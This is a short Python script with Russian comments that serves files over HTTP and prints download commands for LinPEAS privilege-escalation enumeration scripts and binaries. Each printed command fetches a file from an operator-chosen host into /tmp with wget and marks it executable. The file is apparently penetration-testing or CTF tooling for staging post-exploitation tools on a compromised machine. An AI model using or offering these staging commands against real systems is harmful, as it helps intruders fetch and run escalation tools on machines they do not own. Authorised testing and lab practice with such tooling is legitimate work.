import subprocess
import argparse
import sys

# Настройка парсера аргументов
parser = argparse.ArgumentParser(description="Python Server File Unloading")
parser.add_argument("-ip", "--ip", dest="sub_ip", help="IP адрес", default="127.0.0.1", required=True)
parser.add_argument("-p", "--port", dest="sub_port", type=int, help="Порт", required=True)

# Парсинг аргументов
options = parser.parse_args()
ip = options.sub_ip
port = options.sub_port

# Проверка валидности порта
if not (1 <= port <= 65535):
    print("Ошибка: Укажите порт в диапазоне 1-65535.")
    sys.exit(1)

# Сообщение о старте
print(f"Start PSFU - Python Server File Unloading")
print(f"--------------------------------------------------")

# Список файлов для загрузки
files = [
    "linpeas.sh",
    "linpeas_darwin_amd64",
    "linpeas_darwin_arm64",
    "linpeas_fat.sh",
    "linpeas_linux_386",
    "linpeas_linux_amd64",
    "linpeas_linux_arm",
    "linpeas_linux_arm64",
    "linpeas_small.sh"
]

# Генерация и вывод команд для каждого файла
for file in files:
    command = f"cd /tmp && wget http://{ip}:{port}/linux/{file} && chmod +x {file}"
    print(command)

print(f"--------------------------------------------------")

# Запуск HTTP сервера
try:
    print(f"Запуск HTTP сервера на {ip}:{port}...")
    subprocess.run(["python3", "-m", "http.server", str(port)], check=True)
except subprocess.CalledProcessError as e:
    print(f"Ошибка при запуске сервера: {e}")
    sys.exit(1)
except KeyboardInterrupt:
    print("\nСервер остановлен пользователем.")
    sys.exit(0)
